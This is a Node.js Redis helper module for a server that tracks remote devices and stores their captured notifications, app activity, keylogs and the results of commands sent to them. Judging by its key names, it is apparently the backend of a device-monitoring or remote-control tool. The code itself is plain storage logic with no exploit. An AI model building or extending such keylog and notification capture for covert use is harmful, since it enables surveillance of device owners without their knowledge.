'use strict';

/**
 * REDIS CLIENT
 * Connects to REDIS_URL and exposes typed helpers used throughout server.js.
 *
 * Redis may be hosted on an idle-suspending plan, so this client keeps the
 * authenticated connection warm and retries indefinitely when the provider
 * wakes the service back up.
 */

const Redis = require('ioredis');

// ── TTLs ─────────────────────────────────────────────────────────────────────
const TTL = {
    device:       3600 * 24 * 7,  // 7 days   – device info
    notifications: 3600 * 24,     // 24 hours – per-device notifications
    activity:      3600 * 6,      // 6 hours  – per-device activity
    keylogs:       3600 * 24,     // 24 hours – per-device keylogs
    command:       3600,          // 1 hour   – command result cache
};

// ── Caps ─────────────────────────────────────────────────────────────────────
const CAP = {
    notifications: 200,
    activity:      100,
    keylogs:       500,
};

// ── Key helpers ───────────────────────────────────────────────────────────────
const K = {
    device:         (id)  => `device:${id}`,
    deviceOnline:   ()    => 'devices:online',            // SET of online deviceIds
    deviceList:     ()    => 'devices:all',               // SET of all known deviceIds
    notifications:  (id)  => `notifications:${id}`,      // LIST
    activity:       (id)  => `activity:${id}`,            // LIST
    keylogs:        (id)  => `keylogs:${id}`,             // LIST
    command:        (cid) => `command:${cid}`,            // HASH
};

let redis = null;
let connected = false;
let configuredUrl = process.env.REDIS_URL || '';
let initPromise = null;
let keepAliveTimer = null;
let redisGeneration = 0;
const operationErrorLogAt = new Map();

// A PING every two minutes prevents idle-suspending Redis plans from going
// dormant while still keeping traffic negligible.
const KEEPALIVE_INTERVAL_MS = 2 * 60 * 1000;

function log(msg, level = 'info') {
    const ts = new Date().toISOString().slice(11, 23);
    const fn = level === 'error' ? console.error : level === 'warn' ? console.warn : console.log;
    fn(`[${ts}][REDIS] ${msg}`);
}

function startKeepAlive() {
    if (keepAliveTimer || !redis) return;
    keepAliveTimer = setInterval(async () => {
        if (!redis || redis.status !== 'ready') return;
        try {
            await redis.ping();
        } catch (e) {
            log(`Keepalive ping failed: ${e.message}`, 'warn');
        }
    }, KEEPALIVE_INTERVAL_MS);
    // The keepalive must not prevent a deliberate server shutdown.
    keepAliveTimer.unref?.();
}

function stopKeepAlive() {
    if (keepAliveTimer) {
        clearInterval(keepAliveTimer);
        keepAliveTimer = null;
    }
}

function readyClient() {
    return connected && redis?.status === 'ready' ? redis : null;
}

function isTransientConnectionError(error) {
    const message = String(error?.message || error || '');
    return /connection is closed|connection closed|socket.*closed|econnreset|epipe|broken pipe|connection lost|not writable|timed out/i.test(message);
}

function logOperationError(operation, error, client) {
    // A connection can close between the readiness check and a command reply.
    // Those are expected during reconnects and must not produce one warning per
    // incoming keylog/activity event.
    if (client !== redis || client?.status !== 'ready' || isTransientConnectionError(error)) return;

    const now = Date.now();
    const previous = operationErrorLogAt.get(operation) || 0;
    if (now - previous < 30000) return;
    operationErrorLogAt.set(operation, now);
    if (operationErrorLogAt.size > 100) {
        for (const [key, timestamp] of operationErrorLogAt) {
            if (now - timestamp >= 30000) operationErrorLogAt.delete(key);
        }
    }
    log(`${operation} error: ${error.message}`, 'warn');
}

/**
 * Initialise the Redis client.
 * Call once at server startup — returns a Promise that resolves when ready.
 */
async function init(urlOverride) {
    if (typeof urlOverride === 'string') configuredUrl = urlOverride.trim();
    const url = configuredUrl;
    if (!url) {
        connected = false;
        log('REDIS_URL not set — Redis disabled (running in-memory only)', 'warn');
        return;
    }

    if (redis && ['ready', 'connecting', 'reconnecting', 'connect', 'wait'].includes(redis.status)) {
        return initPromise || undefined;
    }

    if (initPromise) return initPromise;

    const generation = ++redisGeneration;
    const client = new Redis(url, {
        maxRetriesPerRequest: 3,
        enableReadyCheck: true,
        retryStrategy(times) {
            // Keep trying: an idle Redis plan can temporarily suspend and
            // needs more than five attempts to become available again.
            const delay = Math.min(1000 * (2 ** Math.min(times - 1, 5)), 30000);
            log(`Reconnecting in ${delay}ms (attempt ${times})…`, 'warn');
            return delay;
        },
        connectTimeout: 10000,
        keepAlive: 30000,
        lazyConnect: false,
    });
    redis = client;
    connected = false;

    let resolveInitial;
    let settled = false;
    let startupTimer = null;
    const pending = new Promise(resolve => { resolveInitial = resolve; });
    initPromise = pending;
    const finishInitial = () => {
        if (settled) return;
        settled = true;
        if (startupTimer) clearTimeout(startupTimer);
        if (initPromise === pending) initPromise = null;
        resolveInitial();
    };
    startupTimer = setTimeout(finishInitial, 5000); // don't block startup indefinitely
    startupTimer.unref?.();

    const isCurrentClient = () => redis === client && redisGeneration === generation;
    client.on('connect', () => {
        if (isCurrentClient()) log('TCP connection established');
    });
    client.on('ready', () => {
        if (!isCurrentClient()) return;
        connected = true;
        startKeepAlive();
        log('Connected to Redis — persistent connection ready');
        finishInitial();
    });
    client.on('error', error => {
        if (isCurrentClient()) log(`Error: ${error.message}`, 'error');
    });
    client.on('close', () => {
        if (!isCurrentClient()) return;
        connected = false;
        log('Connection closed', 'warn');
    });
    client.on('reconnecting', ms => {
        if (!isCurrentClient()) return;
        connected = false;
        log(`Reconnecting in ${ms}ms…`);
    });

    return pending;
}

/** Whether Redis is currently usable */
function isConnected() { return readyClient() !== null; }

/** Raw client (for advanced usage) */
function client() { return redis; }

// ── Device helpers ────────────────────────────────────────────────────────────

async function saveDevice(deviceId, info) {
    const client = readyClient();
    if (!client) return;
    try {
        const key = K.device(deviceId);
        const payload = typeof info === 'string' ? info : JSON.stringify(info);
        await client.setex(key, TTL.device, payload);
        await client.sadd(K.deviceList(), deviceId);
        if (info.isOnline) {
            await client.sadd(K.deviceOnline(), deviceId);
        } else {
            await client.srem(K.deviceOnline(), deviceId);
        }
    } catch (e) {
        logOperationError('saveDevice', e, client);
    }
}

async function getDevice(deviceId) {
    const client = readyClient();
    if (!client) return null;
    try {
        const raw = await client.get(K.device(deviceId));
        return raw ? JSON.parse(raw) : null;
    } catch (e) {
        logOperationError('getDevice', e, client);
        return null;
    }
}

async function getAllDevices() {
    const client = readyClient();
    if (!client) return [];
    try {
        const ids = await client.smembers(K.deviceList());
        if (!ids.length) return [];
        const pipeline = client.pipeline();
        ids.forEach(id => pipeline.get(K.device(id)));
        const results = await pipeline.exec();
        return results
            .map(([err, val]) => (!err && val ? JSON.parse(val) : null))
            .filter(Boolean);
    } catch (e) {
        logOperationError('getAllDevices', e, client);
        return [];
    }
}

async function markDeviceOnline(deviceId) {
    const client = readyClient();
    if (!client) return;
    try {
        await client.sadd(K.deviceOnline(), deviceId);
        const raw = await client.get(K.device(deviceId));
        if (raw) {
            const d = JSON.parse(raw);
            d.isOnline = true;
            d.lastSeen = new Date().toISOString();
            await client.setex(K.device(deviceId), TTL.device, JSON.stringify(d));
        }
    } catch (e) {
        logOperationError('markDeviceOnline', e, client);
    }
}

async function markDeviceOffline(deviceId) {
    const client = readyClient();
    if (!client) return;
    try {
        await client.srem(K.deviceOnline(), deviceId);
        const raw = await client.get(K.device(deviceId));
        if (raw) {
            const d = JSON.parse(raw);
            d.isOnline = false;
            d.lastSeen = new Date().toISOString();
            await client.setex(K.device(deviceId), TTL.device, JSON.stringify(d));
        }
    } catch (e) {
        logOperationError('markDeviceOffline', e, client);
    }
}

async function removeDevice(deviceId) {
    const client = readyClient();
    if (!client) return false;
    try {
        await client.del(K.device(deviceId));
        await client.srem(K.deviceList(), deviceId);
        await client.srem(K.deviceOnline(), deviceId);
        return true;
    } catch (e) {
        logOperationError('removeDevice', e, client);
        return false;
    }
}

// ── Notification helpers ──────────────────────────────────────────────────────

async function pushNotification(deviceId, entry) {
    const client = readyClient();
    if (!client) return;
    try {
        const key = K.notifications(deviceId);
        await client.lpush(key, JSON.stringify(entry));
        await client.ltrim(key, 0, CAP.notifications - 1);
        await client.expire(key, TTL.notifications);
    } catch (e) {
        logOperationError('pushNotification', e, client);
    }
}

async function getNotifications(deviceId) {
    const client = readyClient();
    if (!client) return [];
    try {
        const items = await client.lrange(K.notifications(deviceId), 0, -1);
        return items.map(i => { try { return JSON.parse(i); } catch { return null; } }).filter(Boolean);
    } catch (e) {
        logOperationError('getNotifications', e, client);
        return [];
    }
}

// ── Activity helpers ──────────────────────────────────────────────────────────

async function pushActivity(deviceId, entry) {
    const client = readyClient();
    if (!client) return;
    try {
        const key = K.activity(deviceId);
        // Dedupe consecutive same-app entries
        const latest = await client.lindex(key, 0);
        if (latest) {
            const prev = JSON.parse(latest);
            if (prev.packageName === entry.packageName) return;
        }
        await client.lpush(key, JSON.stringify(entry));
        await client.ltrim(key, 0, CAP.activity - 1);
        await client.expire(key, TTL.activity);
    } catch (e) {
        logOperationError('pushActivity', e, client);
    }
}

async function getActivity(deviceId) {
    const client = readyClient();
    if (!client) return [];
    try {
        const items = await client.lrange(K.activity(deviceId), 0, -1);
        return items.map(i => { try { return JSON.parse(i); } catch { return null; } }).filter(Boolean);
    } catch (e) {
        logOperationError('getActivity', e, client);
        return [];
    }
}

// ── Keylog helpers ────────────────────────────────────────────────────────────

async function pushKeylog(deviceId, entry) {
    const client = readyClient();
    if (!client) return;
    try {
        const key = K.keylogs(deviceId);
        await client.lpush(key, JSON.stringify(entry));
        await client.ltrim(key, 0, CAP.keylogs - 1);
        await client.expire(key, TTL.keylogs);
    } catch (e) {
        logOperationError('pushKeylog', e, client);
    }
}

async function getKeylogs(deviceId) {
    const client = readyClient();
    if (!client) return [];
    try {
        const items = await client.lrange(K.keylogs(deviceId), 0, -1);
        return items.map(i => { try { return JSON.parse(i); } catch { return null; } }).filter(Boolean);
    } catch (e) {
        logOperationError('getKeylogs', e, client);
        return [];
    }
}

// ── Command cache helpers ─────────────────────────────────────────────────────

async function cacheCommandResult(commandId, result) {
    const client = readyClient();
    if (!client) return;
    try {
        await client.setex(K.command(commandId), TTL.command, JSON.stringify(result));
    } catch (e) {
        logOperationError('cacheCommandResult', e, client);
    }
}

async function getCachedCommandResult(commandId) {
    const client = readyClient();
    if (!client) return null;
    try {
        const raw = await client.get(K.command(commandId));
        return raw ? JSON.parse(raw) : null;
    } catch (e) {
        logOperationError('getCachedCommandResult', e, client);
        return null;
    }
}

// ── Stats ─────────────────────────────────────────────────────────────────────

async function getStats() {
    const client = readyClient();
    if (!client) return { connected: false };
    try {
        await client.info('stats');
        const onlineCount = await client.scard(K.deviceOnline());
        const totalCount  = await client.scard(K.deviceList());
        const memLine     = (await client.info('memory')).split('\n').find(l => l.startsWith('used_memory_human'));
        const memUsed     = memLine ? memLine.split(':')[1].trim() : 'unknown';
        return { connected: true, onlineDevices: onlineCount, totalDevices: totalCount, memoryUsed: memUsed };
    } catch (e) {
        logOperationError('getStats', e, client);
        return { connected: false, error: e.message };
    }
}

// ── Session reset helper ──────────────────────────────────────────────────────

/**
 * Delete cached command results for one device, or all devices when called
 * without a device ID. Scoped resets preserve other devices' cached results.
 */
async function clearCommandCache(deviceId = null) {
    const client = readyClient();
    if (!client) return 0;
    try {
        const targetDeviceId = deviceId == null ? null : String(deviceId);
        let cursor = '0';
        let deleted = 0;
        do {
            const [nextCursor, keys] = await client.scan(cursor, 'MATCH', 'command:*', 'COUNT', 200);
            cursor = nextCursor;
            if (keys.length) {
                let deleteKeys = keys;
                if (targetDeviceId !== null) {
                    const values = await client.mget(...keys);
                    deleteKeys = keys.filter((key, index) => {
                        if (!values[index]) return false;
                        try {
                            return String(JSON.parse(values[index])?.deviceId || '') === targetDeviceId;
                        } catch (_) {
                            return false;
                        }
                    });
                }
                if (deleteKeys.length) {
                    await client.del(...deleteKeys);
                    deleted += deleteKeys.length;
                }
            }
        } while (cursor !== '0');
        log(`clearCommandCache: removed ${deleted} command cache key(s)${targetDeviceId === null ? '' : ` for ${targetDeviceId}`}`);
        return deleted;
    } catch (e) {
        logOperationError('clearCommandCache', e, client);
        return 0;
    }
}

// ── Graceful shutdown ─────────────────────────────────────────────────────────

async function quit() {
    stopKeepAlive();
    const client = redis;
    ++redisGeneration;
    redis = null;
    connected = false;
    initPromise = null;
    if (!client) return;

    if (client.status !== 'ready') {
        try { client.disconnect(); } catch (_) {}
        return;
    }

    let timeout;
    try {
        await Promise.race([
            client.quit().catch(() => {}),
            new Promise(resolve => {
                timeout = setTimeout(resolve, 2000);
                timeout.unref?.();
            }),
        ]);
        log('Disconnected gracefully');
    } catch (_) {
        // A closing/reconnecting Redis client is already unavailable; do not
        // let shutdown wait indefinitely for its QUIT response.
    } finally {
        if (timeout) clearTimeout(timeout);
        if (client.status !== 'end') {
            try { client.disconnect(); } catch (_) {}
        }
    }
}

/** Stop the current connection without changing the configured URL. */
async function stop() {
    await quit();
}

/** Start Redis using the current URL, or an optional replacement URL. */
async function start(urlOverride) {
    if (typeof urlOverride === 'string') configuredUrl = urlOverride.trim();
    return init();
}

/** Restart Redis using the current URL, or an optional replacement URL. */
async function restart(urlOverride) {
    await stop();
    return start(urlOverride);
}

function getConfiguredUrl() {
    return configuredUrl;
}

function setConfiguredUrl(url) {
    configuredUrl = typeof url === 'string' ? url.trim() : '';
}

module.exports = {
    init, start, stop, restart, getConfiguredUrl, setConfiguredUrl, isConnected, client, quit, getStats,
    saveDevice, getDevice, getAllDevices, markDeviceOnline, markDeviceOffline,
    removeDevice,
    pushNotification, getNotifications,
    pushActivity, getActivity,
    pushKeylog, getKeylogs,
    cacheCommandResult, getCachedCommandResult,
    clearCommandCache,
};
